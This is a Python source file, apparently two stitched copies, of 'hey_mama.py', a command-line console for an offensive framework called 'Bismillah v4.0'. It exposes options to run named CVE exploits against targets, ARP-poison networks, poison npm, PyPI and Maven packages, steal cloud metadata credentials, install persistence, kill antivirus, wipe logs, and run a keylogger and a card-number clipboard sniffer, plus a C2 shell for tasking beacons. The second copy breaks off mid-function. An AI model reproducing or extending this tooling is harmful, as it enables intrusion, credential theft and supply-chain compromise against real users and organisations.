      LISTBEACONS           → show known beacon IDs
      EXIT                  → quit shell
    """
    print("\n[+] Entering interactive C2 shell. Type EXIT to quit.")
    while True:
        try:
            cmd = input("C2> ").strip()
        except (KeyboardInterrupt, EOFError):
            print("\nExiting C2 shell.")
            break

        if not cmd:
            continue
        cmd_upper = cmd.upper()
        if cmd_upper == "EXIT":
            break
        if cmd_upper == "LISTBEACONS":
            path = "/tmp/known_beacons.json"
            if os.path.exists(path):
                try:
                    with open(path, "r") as f:
                        b = json.load(f)
                    print("Known Beacons:")
                    for bid in b:
                        print(f"  - {bid}")
                except Exception as e:
                    print(f"[!] Failed to read known_beacons.json: {e}")
            else:
                print("[!] No known_beacons.json file found. No beacons recorded yet.")
            continue
        if cmd_upper.startswith("EXEC:"):
            raw = cmd[5:].strip()
            try:
                task = json.loads(raw)
            except json.JSONDecodeError:
                print("[!] EXEC: payload must be valid JSON.")
                continue
            beacon_id = task.get("beacon_id", "")
            try:
                add_http_task({"beacon_id": beacon_id, "task": task})
                print(f"[+] Sent task to HTTP C2: {task}")
            except Exception as e:
                print(f"[!] Failed to send to HTTP C2: {e}")
            continue

        print("[!] Unknown command. Use EXEC:<json>, LISTBEACONS, or EXIT.")


def audit_firewall():
    """
    Prints firewall/nftables/ufw/iptables rules depending on OS.
    """
    try:
        if sys.platform.startswith("linux"):
            if shutil.which("ufw"):
                subprocess.call(["ufw", "status", "verbose"])
            else:
                subprocess.call(["iptables", "-L", "-n", "-v"])
        elif sys.platform == "darwin":
            subprocess.call(["pfctl", "-sr"])
        else:  # Windows
            subprocess.call(["netsh", "advfirewall", "firewall", "show", "rule", "name=all"])
    except Exception as e:
        print(f"[!] Firewall audit failed: {e}")


def inspect_logs():
    """
    Prints recent system logs for quick inspection.
    """
    try:
        if sys.platform.startswith("linux"):
            subprocess.call(["bash", "-c", "tail -n 50 /var/log/syslog 2>/dev/null || tail -n 50 /var/log/messages"])
        elif sys.platform == "darwin":
            subprocess.call(["bash", "-c", "log show --last 1h | tail -n 50"])
        else:  # Windows
            subprocess.call(["wevtutil", "qe", "Application", "/rd:true", "/c:50", "/f:text"])
    except Exception as e:
        print(f"[!] Log inspect failed: {e}")


def remediate(os_name: str):
    """
    Basic remediation: stop known insecure services, tighten firewall, etc.
    """
    os_name = os_name.lower()
    try:
        if os_name == "linux":
            print("[*] Disabling SSH root login, firewall to deny all inbound...")
            subprocess.call(["bash", "-c", "sed -i 's/#PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config"])
            subprocess.call(["bash", "-c", "ufw default deny incoming; ufw allow ssh; ufw --force enable"])
            print("[+] Linux remediation applied.")
        elif os_name == "macos":
            print("[*] Disabling remote login, enabling macOS firewall...")
            subprocess.call(["bash", "-c", "sudo systemsetup -setremotelogin off"])
            subprocess.call(["bash", "-c", "sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 1"])
            print("[+] macOS remediation applied.")
        elif os_name == "windows":
            print("[*] Disabling RDP, blocking ports 3389,445...")
            subprocess.call(["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server", "/v", "fDenyTSConnections", "/t", "REG_DWORD", "/d", "1", "/f"])
            subprocess.call(["netsh", "advfirewall", "firewall", "add", "rule", "name=BlockSMBandRDP", "dir=in", "action=block", "protocol=TCP", "localport=3389,445"])
            print("[+] Windows remediation applied.")
        else:
            print(f"[!] Unsupported OS for remediation: {os_name}")
    except Exception as e:
        print(f"[!] Remediate failed: {e}")


# ──────────────────────────────────────────────────────────────────────────────
#                                  Main Logic
# ──────────────────────────────────────────────────────────────────────────────


def main():
    parser = argparse.ArgumentParser(
        description="hey_mama.py – CLI Front‑end for Bismillah v4.0"
    )
    parser.add_argument("--version", action="store_true", help="Show version and exit")

    # 1) Reconnaissance options
    parser.add_argument("--scan", metavar="SUBNET", help="Nmap scan (TCP/UDP) eg: 10.0.0.0/24")
    parser.add_argument("--shodan", metavar="QUERY", help="Shodan search for QUERY")
    parser.add_argument("--dnsenum", metavar="DOMAIN", help="DNS enumeration for DOMAIN")
    parser.add_argument("--wifi_scan", action="store_true", help="Wi‑Fi scan (Linux/macOS)")
    parser.add_argument("--arp_poison", nargs=2, metavar=("IFACE", "TARGET"), help="ARP‑poison <IFACE> towards <TARGET>")
    parser.add_argument("--passive_dns", metavar="DOMAIN", help="PassiveDNS lookup of DOMAIN")

    # 2) Exploit management
    parser.add_argument("--exploit_list", action="store_true", help="List all local exploits")
    parser.add_argument("--run_exploit", nargs=2, metavar=("NAME", "TARGET"), help="Run exploit NAME against TARGET")
    parser.add_argument("--can_run", nargs=2, metavar=("NAME", "TARGET"), help="Check if exploit likely works against TARGET")

    # 3) Supply‑Chain & Cloud
    parser.add_argument("--npm_inject", nargs=2, metavar=("PKG", "PAYLOAD_JS"), help="Poison NPM package PKG with PAYLOAD_JS")
    parser.add_argument("--pip_inject", nargs=2, metavar=("PKG", "PAYLOAD_PY"), help="Poison PyPI package PKG with PAYLOAD_PY")
    parser.add_argument("--maven_inject", nargs=2, metavar=("GROUP:ARTIFACT", "PAYLOAD_JAVA"), help="Poison Maven artifact GROUP:ARTIFACT with PAYLOAD_JAVA")
    parser.add_argument("--cloud_aws", action="store_true", help="Steal AWS metadata & enumerate S3")
    parser.add_argument("--cloud_azure", action="store_true", help="Steal Azure metadata & enumerate Blobs")
    parser.add_argument("--cloud_gcp", action="store_true", help="Steal GCP metadata & enumerate GCS")

    # 4) Persistence
    parser.add_argument("--persist_linux", metavar="SCRIPT", help="Install Linux systemd+udev persistence for SCRIPT")
    parser.add_argument("--persist_win_schtask", metavar="SCRIPT", help="Create Windows Scheduled Task for SCRIPT")
    parser.add_argument("--persist_win_rkey", metavar="SCRIPT", help="Add Run key persistence for SCRIPT")
    parser.add_argument("--persist_mac_daemon", metavar="SCRIPT", help="Create macOS LaunchDaemon for SCRIPT")

    # 5) Stealth & Anti‑Forensics
    parser.add_argument("--stealth", action="store_true", help="Kill AV/EDR and unload rootkit if present")
    parser.add_argument("--wipe_logs", action="store_true", help="Wipe system logs on current OS")

    # 6) Keylogging & Sensitive Capture
    parser.add_argument("--start_keylogger", metavar="DB_PATH", help="Start cross‑platform keylogger (store at DB_PATH)")
    parser.add_argument("--start_clip_sniffer", metavar="DB_PATH", help="Start clipboard sniffer (store at DB_PATH)")
    parser.add_argument("--start_screen_cap", metavar="DB_PATH:KEYWORD", help="Capture screenshots when KEYWORD typed, store in DB_PATH")

    # 7) C2 Interaction
    parser.add_argument("--launch_dispatcher", action="store_true", help="Start the full Bismillah dispatcher")
    parser.add_argument("--c2_shell", action="store_true", help="Launch interactive C2 shell (must have dispatcher running)")

    # 8) Defensive Utilities
    parser.add_argument("--firewall_audit", action="store_true", help="Audit firewall rules")
    parser.add_argument("--log_inspect", action="store_true", help="Inspect recent system logs")
    parser.add_argument("--remediate", metavar="OS", help="Basic remediation for OS (linux|macos|windows)")

    args = parser.parse_args()

    if args.version:
        print(f"hey_mama.py – Bismillah v4.0 Front‑end (version {__version__})")
        sys.exit(0)

    # ──────────────────────────────────────────────────────────────────────────
    # Reconnaissance & Scanning
    if args.scan:
        print(f"[+] Running Nmap scan on {args.scan}...")
        # Launch full recon_loop in background; it handles Nmap, Shodan, etc.
        threading.Thread(target=recon_loop, daemon=True).start()
        # Allow user to see initial output
        time.sleep(5)
        sys.exit(0)

    if args.shodan:
        from shodan import Shodan
        api_key = os.getenv("SHODAN_API_KEY", "")
        if not api_key:
            print("[!] SHODAN_API_KEY not set.")
            sys.exit(1)
        try:
            sh = Shodan(api_key)
            results = sh.search(args.shodan)
            print(f"Shodan found {results['total']} hosts:")
            for r in results["matches"][:10]:
                print(f"  - {r['ip_str']}  {r['data'][:80]}...")
        except Exception as e:
            print(f"[!] Shodan search failed: {e}")
        sys.exit(0)

    if args.dnsenum:
        print(f"[+] Enumerating DNS for {args.dnsenum}...")
        try:
            import dns.resolver
            record_types = ["A", "NS", "MX", "TXT"]
            for rtype in record_types:
                try:
                    answers = dns.resolver.resolve(args.dnsenum, rtype, lifetime=5)
                    print(f"{rtype} records:")
                    for ans in answers:
                        print(f"  - {ans.to_text()}")
                except Exception as e:
                    print(f"  [!] {rtype} lookup failed: {e}")
            sys.exit(0)
        except ImportError:
            print("[!] dnspython not installed.")
            sys.exit(1)

    if args.wifi_scan:
        print("[+] Performing Wi‑Fi scan...")
        if sys.platform.startswith("linux"):
            subprocess.call(["bash", "-c", "sudo iwlist scan"])
        elif sys.platform == "darwin":
            subprocess.call(
                ["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-s"]
            )
        else:
            print("[!] Wi‑Fi scan not supported on this OS.")
        sys.exit(0)

    if args.arp_poison:
        iface, tgt = args.arp_poison
        print(f"[+] Starting ARP poison on interface {iface} targeting {tgt} ...")
        threading.Thread(target=arp_poison_and_sniff, args=(iface, tgt, None), daemon=True).start()
        print("[*] ARP poison initiated. Capturing first 100 TCP packets...")
        sys.exit(0)

    if args.passive_dns:
        print(f"[+] Performing PassiveDNS lookup for {args.passive_dns} ...")
        threading.Thread(target=passive_dns_exfil, args=(args.passive_dns,), daemon=True).start()
        time.sleep(2)
        sys.exit(0)

    # ──────────────────────────────────────────────────────────────────────────
    # Exploit Management
    if args.exploit_list:
        list_local_exploits()
        sys.exit(0)

    if args.run_exploit:
        name, target = args.run_exploit
        print(f"[+] Running exploit {name} against {target} ...")
        try:
            res = run_exploit(name, target)
            print(f"Result: {res}")
        except Exception as e:
            print(f"[!] run_exploit failed: {e}")
        sys.exit(0)

    if args.can_run:
        name, target = args.can_run
        try:
            mod = _load_exploit_module(name)
            if hasattr(mod, "can_run_on"):
                ok = mod.can_run_on(target)
                print(f"[+] can_run_on('{name}','{target}') → {ok}")
            else:
                print(f"[i] Exploit {name} has no can_run_on() function.")
        except Exception as e:
            print(f"[!] Error loading exploit {name}: {e}")
        sys.exit(0)

    # ──────────────────────────────────────────────────────────────────────────
    # Supply‑Chain & Cloud
    if args.npm_inject:
        pkg, payload = args.npm_inject
        print(f"[+] Attempting NPM supply‑chain inject: package={pkg}, payload file={payload}")
        try:
            success = npm_supply_chain_inject(pkg, payload)
            print(f"** Success: {success}")
        except Exception as e:
            print(f"[!] npm_inject failed: {e}")
        sys.exit(0)

    if args.pip_inject:
        pkg, payload = args.pip_inject
        print(f"[+] Attempting PyPI supply‑chain inject: package={pkg}, payload file={payload}")
        try:
            success = pip_supply_chain_inject(pkg, payload)
            print(f"** Success: {success}")
        except Exception as e:
            print(f"[!] pip_inject failed: {e}")
        sys.exit(0)

    if args.maven_inject:
        gav, payload = args.maven_inject
        if ":" not in gav:
            print("[!] Maven inject requires GROUP:ARTIFACT format.")
            sys.exit(1)
        group, art = gav.split(":", 1)
        print(f"[+] Attempting Maven inject: {group}:{art} with payload file={payload}")
        try:
            success = maven_supply_chain_inject(group, art, payload)
            print(f"** Success: {success}")
        except Exception as e:
            print(f"[!] maven_inject failed: {e}")
        sys.exit(0)

    if args.cloud_aws:
        print("[+] Stealing AWS metadata and enumerating S3 buckets...")
        try:
            res = aws_metadata_steal()
            print(f"Result: {res}")
        except Exception as e:
            print(f"[!] AWS metadata steal failed: {e}")
        sys.exit(0)

    if args.cloud_azure:
        print("[+] Stealing Azure metadata and enumerating Blobs...")
        try:
            res = azure_metadata_steal()
            print(f"Result: {res}")
        except Exception as e:
            print(f"[!] Azure metadata steal failed: {e}")
        sys.exit(0)

    if args.cloud_gcp:
        print("[+] Stealing GCP metadata and enumerating GCS buckets...")
        try:
            res = gcp_metadata_steal()
            print(f"Result: {res}")
        except Exception as e:
            print(f"[!] GCP metadata steal failed: {e}")
        sys.exit(0)

    # ──────────────────────────────────────────────────────────────────────────
    # Persistence
    if args.persist_linux:
        script = args.persist_linux
        print(f"[+] Installing Linux systemd + udev persistence for {script} ...")
        try:
            ok1 = linux_systemd_service(script)
            ok2 = linux_udev_rule()
            print(f"** systemd: {ok1}, udev: {ok2}")
        except Exception as e:
            print(f"[!] Persistence installation failed: {e}")
        sys.exit(0)

    if args.persist_win_schtask:
        script = args.persist_win_schtask
        print(f"[+] Creating Windows Scheduled Task for {script} ...")
        try:
            ok = windows_schtask(script)
            print(f"** Scheduled Task created: {ok}")
        except Exception as e:
            print(f"[!] windows_schtask failed: {e}")
        sys.exit(0)

    if args.persist_win_rkey:
        script = args.persist_win_rkey
        print(f"[+] Adding Run key persistence for {script} ...")
        try:
            ok = windows_run_key(script)
            print(f"** Run key added: {ok}")
        except Exception as e:
            print(f"[!] windows_run_key failed: {e}")
        sys.exit(0)

    if args.persist_mac_daemon:
        script = args.persist_mac_daemon
        print(f"[+] Installing macOS LaunchDaemon for {script} ...")
        try:
            ok = macos_launchdaemon(script)
            print(f"** LaunchDaemon installed: {ok}")
        except Exception as e:
            print(f"[!] macos_launchdaemon failed: {e}")
        sys.exit(0)

    # ──────────────────────────────────────────────────────────────────────────
    # Stealth & Anti‑Forensics
    if args.stealth:
        print("[+] Starting stealth sequence (kill AV/EDR, unload rootkit)...")
        try:
            threading.Thread(target=stealth_loop, daemon=True).start()
            print("[*] Stealth loop running in background.")
        except Exception as e:
            print(f"[!] stealth_loop failed: {e}")
        sys.exit(0)

    if args.wipe_logs:
        print("[+] Wiping logs on this OS...")
        try:
            if sys.platform.startswith("linux"):
                clear_linux_logs()
            elif sys.platform == "darwin":
                clear_macos_tcc()
            else:
                clear_windows_logs()
            print("[*] Logs wiped.")
        except Exception as e:
            print(f"[!] wipe_logs failed: {e}")
        sys.exit(0)

    # ──────────────────────────────────────────────────────────────────────────
    # Keylogging & Sensitive Capture
    if args.start_keylogger:
        db_path = args.start_keylogger
        print(f"[+] Starting keylogger, saving to {db_path} ...")
        try:
            threading.Thread(target=keylogger_loop, args=(db_path,), daemon=True).start()
            print("[*] Keylogger thread started.")
        except Exception as e:
            print(f"[!] keylogger_loop failed: {e}")
        sys.exit(0)

    if args.start_clip_sniffer:
        db_path = args.start_clip_sniffer
        print(f"[+] Starting clipboard sniffer, saving to {db_path} ...")
        try:
            threading.Thread(target=clipboard_sniffer, args=(db_path,), daemon=True).start()
            print("[*] Clipboard sniffer thread started.")
        except Exception as e:
            print(f"[!] clipboard_sniffer failed: {e}")
        sys.exit(0)

    if args.start_screen_cap:
        val = args.start_screen_cap
        if ":" not in val:
            print("[!] Provide DB_PATH:KEYWORD")
            sys.exit(1)
        db_path, keyword = val.split(":", 1)
        print(f"[+] Starting screen capture on keyword '{keyword}', saving to {db_path} ...")
        try:
            threading.Thread(target=screen_capture_on_keyword, args=(db_path, keyword), daemon=True).start()
            print("[*] Screen capture thread started.")
        except Exception as e:
            print(f"[!] screen_capture_on_keyword failed: {e}")
        sys.exit(0)

    # ──────────────────────────────────────────────────────────────────────────
    # Defensive Utilities
    if args.firewall_audit:
        print("[+] Auditing firewall rules...")
        audit_firewall()
        sys.exit(0)

    if args.log_inspect:
        print("[+] Inspecting recent system logs...")
        inspect_logs()
        sys.exit(0)

    if args.remediate:
        os_name = args.remediate
        print(f"[+] Attempting remediation for {os_name} ...")
        remediate(os_name)
        sys.exit(0)

    # ──────────────────────────────────────────────────────────────────────────
    # C2 Interaction
    if args.launch_dispatcher:
        print("[+] Launching full Bismillah dispatcher...")
        dispatcher_path = os.path.join(SCRIPT_DIR, "bismillah.py")
        if not os.path.exists(dispatcher_path):
            print(f"[!] bismillah.py not found at {dispatcher_path}")
            sys.exit(1)
        # Replace current process with dispatcher
        os.execv(sys.executable, [sys.executable, dispatcher_path])
        sys.exit(0)

    if args.c2_shell:
        interactive_c2_shell()
        sys.exit(0)

    # ──────────────────────────────────────────────────────────────────────────
    # If no arguments provided, print help
    parser.print_help()
    sys.exit(1)


if __name__ == "__main__":
    main()
#!/usr/bin/env python3
"""
hey_mama.py – Front‑end CLI for Bismillah v4.0

Usage:
  1) Reconnaissance & Scanning
     • --scan <TARGET_SUBNET>           : Nmap scan (TCP + UDP)
     • --shodan <QUERY>                 : Shodan search
     • --dnsenum <TARGET_DOMAIN>        : DNS enumeration (A/NS/MX/TXT)
     • --wifi_scan                      : Wi‑Fi scan (Linux/macOS)
     • --arp_poison <IFACE> <TARGET>    : ARP‑poison + sniff HTTP traffic
     • --passive_dns <DOMAIN>           : PassiveDNS lookup

  2) Exploit Management
     • --exploit_list                   : List all local exploits
     • --run_exploit <NAME> <TARGET>    : Run named exploit against target
     • --can_run <NAME> <TARGET>        : Check if exploit likely works

  3) Supply‑Chain & Cloud
     • --npm_inject <PKG> <PAYLOAD_JS>  : Poison an NPM package
     • --pip_inject <PKG> <PAYLOAD_PY>  : Poison a PyPI package
     • --maven_inject <GROUP:ARTIF> <PAYLOAD_JAVA>
                                         : Poison a Maven artifact
     • --cloud_aws                       : Steal AWS metadata & enumerate S3
     • --cloud_azure                     : Steal Azure metadata & enumerate Blobs
     • --cloud_gcp                       : Steal GCP metadata & enumerate GCS

  4) Persistence
     • --persist_linux <SCRIPT_PATH>     : Install systemd + udev persistence
     • --persist_win_schtask <SCRIPT>    : Create Windows Scheduled Task
     • --persist_win_rkey <SCRIPT>       : Add Run key persistence
     • --persist_mac_daemon <SCRIPT>     : Install macOS LaunchDaemon

  5) Stealth & Anti‑Forensics
     • --stealth                         : Kill AV/EDR, unload rootkit if present
     • --wipe_logs                       : Wipe logs on Linux/Windows/macOS

  6) Keylogging & Sensitive Capture
     • --start_keylogger <DB_PATH>       : Start keystroke logger (cross‑platform)
     • --start_clip_sniffer <DB_PATH>    : Start clipboard sniffer for CC patterns
     • --start_screen_cap <DB_PATH>:<KEYWORD>
                                          : Capture screenshots when KEYWORD typed

  7) C2 Interaction
     • --launch_dispatcher               : Spawn the full Bismillah dispatcher (bismillah.py)
     • --c2_shell                        : Interactive shell to send C2 tasks
       – Within C2 shell, prefixes: 
           EXEC:<task>      → enqueue task for HTTP/DNS/ICMP beacons 
           LISTBEACONS      → list known beacons (by ID)
           EXIT             → exit shell

  8) Defensive Utilities (audit/inspect)
     • --firewall_audit                  : Display current firewall rules
     • --log_inspect                     : Show recent system logs
     • --remediate <OS>                  : Attempt basic remediation (disable insecure services)

  9) Misc
     • --version                         : Print version info and exit
     • --help                            : Show this message

Examples:
  hey_mama.py --scan 192.168.1.0/24
  hey_mama.py --run_exploit cve_2021_26855_proxylogon 10.0.0.5
  hey_mama.py --npm_inject lodash /path/to/payload.js
  hey_mama.py --launch_dispatcher
"""

import argparse
import sys
import threading
import time
import logging
import os
import readline      # for interactive shell history
import json

# Import all improved modules
from modules.reconnaissance_ext import (
    recon_loop,
    passive_dns_exfil,
    arp_poison_and_sniff,
)
from modules.c2_server import add_task as add_http_task
from modules.dns_c2_server import add_task as add_dns_task
from modules.icmp_c2 import add_icmp_task
from modules.exploit_manager import run_exploit, _load_exploit_module, fetch_latest_exploits
from modules.exploit_lib.cve_2019_0708_bluekeep import exploit as bluekeep_exploit, can_run_on as can_run_bluekeep
from modules.exploit_lib.cve_2020_0796 import exploit as smbghost_exploit
from modules.exploit_lib.cve_2021_26855_proxylogon import exploit as proxy_exploit, can_run_on as can_run_proxy
from modules.exploit_lib.cve_2021_21985_vmware_vcenter import exploit as vcenter_exploit, can_run_on as can_run_vcenter
from modules.exploit_lib.cve_2021_34527_printnightmare import exploit as pn_exploit, can_run_on as can_run_pn
from modules.exploit_lib.cve_2021_44228_log4j import exploit as log4j_exploit
from modules.exploit_lib.cve_2022_30190_follina import exploit as follina_exploit

from modules.supply_chain import (
    npm_supply_chain_inject,
    pip_supply_chain_inject,
    maven_supply_chain_inject,
)
from modules.cloud_api_compromise import (
    aws_metadata_steal,
    azure_metadata_steal,
    gcp_metadata_steal,
)
from modules.persistence_ext import (
    linux_systemd_service,
    linux_udev_rule,
    windows_schtask,
    windows_run_key,
    macos_launchdaemon,
)
from modules.stealth_ext import stealth_loop, unload_suspicious_rootkits
from modules.anti_forensics_ext import clear_linux_logs, clear_windows_logs, clear_macos_tcc
from modules.keylogger_ext import (
    keylogger_loop,
    clipboard_sniffer,
    screen_capture_on_keyword,
)
from modules.config import load_config
from modules.logger import log_event, logger as core_logger

__version__ = "4.0.0"

core_logger.setLevel(logging.INFO)

# ──────────────────────────────────────────────────────────────────────────────
#                             Helper Functions
# ──────────────────────────────────────────────────────────────────────────────

def list_local_exploits():
    """
    Read `modules/exploit_lib/exploits_index.json` and print all exploit names.
    """
    idx_path = os.path.join(os.path.dirname(__file__), "modules", "exploit_lib", "exploits_index.json")
    try:
        with open(idx_path, "r") as f:
            idx = json.load(f)
        print("Available exploits:")
        for name in idx.keys():
            print("  -", name)
    except Exception as e:
        print(f"[!] Could not read exploits_index.json: {e}")

def interactive_c2_shell():
    """
    A simple REPL that accepts:
      EXEC:<task_json>      → send to HTTP/DNS/ICMP C2
      LISTBEACONS          → show known beacon IDs
      EXIT                 → quit shell
    """
    print("\n[+] Entering interactive C2 shell. Type EXIT to quit.")
    # We assume the HTTP, DNS, and ICMP C2 servers are already running (if using --launch_dispatcher).
    while True:
        try:
            cmd = input("C2> ").strip()
        except (KeyboardInterrupt, EOFError):
            print("\nExiting C2 shell.")
            break

        if not cmd:
            continue
        if cmd.upper() == "EXIT":
            break
        if cmd.upper() == "LISTBEACONS":
            # For simplicity, we can read from a shared file or in‑memory data structure.
            # Here we assume HTTP C2 server writes to /tmp/known_beacons.json
            path = "/tmp/known_beacons.json"
            if os.path.exists(path):
                with open(path, "r") as f:
                    b = json.load(f)
                print("Known Beacons:")
                for bid in b:
                    print("  -", bid)
            else:
                print("[!] No known_beacons.json file found. No beacons recorded yet.")
            continue
        if cmd.upper().startswith("EXEC:"):
            raw = cmd[5:].strip()
            try:
                task = json.loads(raw)
            except json.JSONDecodeError:
                print("[!] EXEC: payload must be valid JSON.")
                continue
            # By default, push to HTTP C2. You could also push to DNS/ICMP as needed.
            add_http_task({"beacon_id": task.get("beacon_id", ""), "task": task})
            print(f"[+] Sent task to HTTP C2: {task}")
            continue

        print("[!] Unknown command. Use EXEC:<json>, LISTBEACONS, or EXIT.")

def audit_firewall():
    """
    Prints firewall/nftables/ufw/iptables rules depending on OS.
    """
    try:
        if sys.platform.startswith("linux"):
            if shutil.which("ufw"):
                os.system("ufw status verbose")
            else:
                os.system("iptables -L -n -v")
        elif sys.platform == "darwin":
            os.system("pfctl -sr")
        else:  # Windows
            os.system("netsh advfirewall firewall show rule name=all")
    except Exception as e:
        print(f"[!] Firewall audit failed: {e}")

def inspect_logs():
    """
    Prints recent system logs for quick inspection.
    """
    try:
        if sys.platform.startswith("linux"):
            os.system("tail -n 50 /var/log/syslog 2>/dev/null || tail -n 50 /var/log/messages")
        elif sys.platform == "darwin":
            os.system("log show --last 1h | tail -n 50")
        else:  # Windows
            os.system("wevtutil qe Application /rd:true /c:50 /f:text")
    except Exception as e:
        print(f"[!] Log inspect failed: {e}")

def remediate(os_name: str):
    """
    Basic remediation: stop known insecure services, tighten firewall, etc.
    """
    os_name = os_name.lower()
    try:
        if os_name == "linux":
            print("[*] Disabling SSH root login, firewall to deny all inbound...")
            os.system("sed -i 's/#PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config")
            os.system("ufw default deny incoming; ufw allow ssh; ufw enable")
            print("[+] Linux remediation applied.")
        elif os_name == "macos":
            print("[*] Disabling remote login, enabling macOS firewall...")
            os.system("systemsetup -setremotelogin off")
            os.system("defaults write /Library/Preferences/com.apple.alf globalstate -int 1")
            print("[+] macOS remediation applied.")
        elif os_name == "windows":
            print("[*] Disabling RDP, blocking ports 3389,445...")
            os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 1 /f")
            os.system("netsh advfirewall firewall add rule name=\"Block SMB and RDP\" dir=in action=block protocol=TCP localport=3389,445")
            print("[+] Windows remediation applied.")
        else:
            print(f"[!] Unsupported OS for remediation: {os_name}")
    except Exception as e:
        print(f"[!] Remediate failed: {e}")

# ──────────────────────────────────────────────────────────────────────────────
#                                  Main Logic
# ──────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="hey_mama.py – CLI Front‑end for Bismillah v4.0"
    )
    parser.add_argument("--version", action="store_true", help="Show version and exit")

    # 1) Reconnaissance options
    parser.add_argument("--scan", metavar="SUBNET", help="Nmap scan (TCP/UDP) eg: 10.0.0.0/24")
    parser.add_argument("--shodan", metavar="QUERY", help="Shodan search for QUERY")
    parser.add_argument("--dnsenum", metavar="DOMAIN", help="DNS enumeration for DOMAIN")
    parser.add_argument("--wifi_scan", action="store_true", help="Wi‑Fi scan (Linux/macOS)")
    parser.add_argument("--arp_poison", nargs=2, metavar=("IFACE", "TARGET"), help="ARP‑poison <IFACE> towards <TARGET>")
    parser.add_argument("--passive_dns", metavar="DOMAIN", help="PassiveDNS lookup of DOMAIN")

    # 2) Exploit management
    parser.add_argument("--exploit_list", action="store_true", help="List all local exploits")
    parser.add_argument("--run_exploit", nargs=2, metavar=("NAME", "TARGET"), help="Run exploit NAME against TARGET")
    parser.add_argument("--can_run", nargs=2, metavar=("NAME", "TARGET"), help="Check if exploit likely works against TARGET")

    # 3) Supply‑Chain & Cloud
    parser.add_argument("--npm_inject", nargs=2, metavar=("PKG", "PAYLOAD_JS"), help="Poison NPM package PKG with PAYLOAD_JS")
    parser.add_argument("--pip_inject", nargs=2, metavar=("PKG", "PAYLOAD_PY"), help="Poison PyPI package PKG with PAYLOAD_PY")
    parser.add_argument("--maven_inject", nargs=2, metavar=("GROUP:ARTIFACT", "PAYLOAD_JAVA"), help="Poison Maven artifact GROUP:ARTIFACT with PAYLOAD_JAVA")
    parser.add_argument("--cloud_aws", action="store_true", help="Steal AWS metadata & enumerate S3")
    parser.add_argument("--cloud_azure", action="store_true", help="Steal Azure metadata & enumerate Blobs")
    parser.add_argument("--cloud_gcp", action="store_true", help="Steal GCP metadata & enumerate GCS")

    # 4) Persistence
    parser.add_argument("--persist_linux", metavar="SCRIPT", help="Install Linux systemd+udev persistence for SCRIPT")
    parser.add_argument("--persist_win_schtask", metavar="SCRIPT", help="Create Windows Scheduled Task for SCRIPT")
    parser.add_argument("--persist_win_rkey", metavar="SCRIPT", help="Add Windows Run key persistence for SCRIPT")
    parser.add_argument("--persist_mac_daemon", metavar="SCRIPT", help="Create macOS LaunchDaemon for SCRIPT")

    # 5) Stealth & Anti‑Forensics
    parser.add_argument("--stealth", action="store_true", help="Kill AV/EDR and unload rootkit if present")
    parser.add_argument("--wipe_logs", action="store_true", help="Wipe system logs on current OS")

    # 6) Keylogging & Sensitive Capture
    parser.add_argument("--start_keylogger", metavar="DB_PATH", help="Start cross‑platform keylogger (store at DB_PATH)")
    parser.add_argument("--start_clip_sniffer", metavar="DB_PATH", help="Start clipboard sniffer (store at DB_PATH)")
    parser.add_argument("--start_screen_cap", metavar="DB_PATH:KEYWORD", help="Capture screenshots when KEYWORD typed, store in DB_PATH")

    # 7) C2 Interaction
    parser.add_argument("--launch_dispatcher", action="store_true", help="Start the full Bismillah dispatcher")
    parser.add_argument("--c2_shell", action="store_true", help="Launch interactive C2 shell (must have dispatcher running)")

    # 8) Defensive Utilities
    parser.add_argument("--firewall_audit", action="store_true", help="Audit firewall rules")
    parser.add_argument("--log_inspect", action="store_true", help="Inspect recent system logs")
    parser.add_argument("--remediate", metavar="OS", help="Basic remediation for OS (linux|macos|windows)")

    args = parser.parse_args()

    if args.version:
        print(f"hey_mama.py – Bismillah v4.0 Front‑end (version {__version__})")
        sys.exit(0)

    # ──────────────────────────────────────────────────────────────────────────
    # Reconnaissance & Scanning
    if args.scan:
        print(f"[+] Running Nmap scan on {args.scan}...")
        threading.Thread(target=recon_loop, daemon=True).start()
        # recon_loop continuously scans; exit immediately or wait few seconds?
        time.sleep(5)
        sys.exit(0)

    if args.shodan:
        from shodan import Shodan
        api_key = os.getenv("SHODAN_API_KEY", "")
        if not api_key:
            print("[!] SHODAN_API_KEY not set.")
            sys.exit(1)
        sh = Shodan(api_key)
        try:
            results = sh.search(args.shodan)
            print(f"Shodan found {results['total']} hosts:")
            for r in results['matches'][:10]:
                print(f"  – {r['ip_str']}  {r['data'][:80]}...")
        except Exception as e:
            print(f"[!] Shodan search failed: {e}")
        sys.exit(0)

    if args.dnsenum:
        print(f"[+] Enumerating DNS for {args.dnsenum}...")
        # Query A, NS, MX, TXT records
        from dnspython import DNSRecord
        for qtype in ["A", "NS", "MX", "TXT"]:
            try:
                answers = DNSRecord.question(args.dnsenum, qtype).send()
                print(f"{qtype} records:\n{answers}\n")
            except Exception as e:
                print(f"[!] {qtype} lookup failed: {e}")
        sys.exit(0)

    if args.wifi_scan:
        print("[+] Performing Wi‑Fi scan...")
        if sys.platform.startswith("linux"):
            os.system("iwlist scan")
        elif sys.platform == "darwin":
            os.system("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s")
        else:
            print("[!] Wi‑Fi scan not supported on this OS.")
        sys.exit(0)

    if args.arp_poison:
        iface, tgt = args.arp_poison
        print(f"[+] Starting ARP poison on interface {iface} targeting {tgt} ...")
        threading.Thread(target=arp_poison_and_sniff, args=(iface, tgt, None), daemon=True).start()
        print("[*] ARP poison initiated. Sniffing traffic for 100 packets...")
        time.sleep(5)
        sys.exit(0)

    if args.passive_dns:
        print(f"[+] Performing PassiveDNS lookup for {args.passive_dns} ...")
        threading.Thread(target=passive_dns_exfil, args=(args.passive_dns,), daemon=True).start()
        time.sleep(2)
        sys.exit(0)

    # ──────────────────────────────────────────────────────────────────────────
    # Exploit Management
    if args.exploit_list:
        list_local_exploits()
        sys.exit(0)

    if args.run_exploit:
        name, target = args.run_exploit
        print(f"[+] Running exploit {name} against {target} ...")
        res = run_exploit(name, target)
        print(f"Result: {res}")
        sys.exit(0)

